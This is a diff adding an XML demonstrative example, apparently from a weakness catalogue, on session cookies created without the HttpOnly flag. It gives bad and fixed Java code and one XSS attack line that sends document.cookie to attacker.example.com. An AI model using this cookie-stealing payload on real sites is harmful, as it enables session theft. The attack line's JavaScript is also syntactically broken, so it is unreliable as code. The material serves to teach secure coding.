@@ -1,0 +1,18 @@
+<Demonstrative_Examples xmlns="http://xmlschema.test/ns" xmlns:xhtml="http://www.w3.org/1999/xhtml">
+            <Demonstrative_Example>
+               <Intro_Text>In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.</Intro_Text>
+               <Body_Text>The snippet of code below establishes a new cookie to hold the sessionID.</Body_Text>
+               <Example_Code Nature="Bad" Language="Java">
+                  <xhtml:div>String sessionID = generateSessionId();<xhtml:br/>Cookie c = new Cookie("session_id", sessionID);<xhtml:br/>response.addCookie(c);</xhtml:div>
+               </Example_Code>
+               <Body_Text>The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:</Body_Text>
+               <Example_Code Nature="Attack" Language="JavaScript">
+                  <xhtml:div>document.write('&lt;img src="http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '"&gt;'</xhtml:div>
+               </Example_Code>
+               <Body_Text>When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.</Body_Text>
+               <Body_Text>To mitigate the risk, use the setHttpOnly(true) method.</Body_Text>
+               <Example_Code Nature="Good" Language="Java">
+                  <xhtml:div>String sessionID = generateSessionId();<xhtml:br/>Cookie c = new Cookie("session_id", sessionID);<xhtml:br/>c.setHttpOnly(true);<xhtml:br/>response.addCookie(c);</xhtml:div>
+               </Example_Code>
+            </Demonstrative_Example>
+         </Demonstrative_Examples>
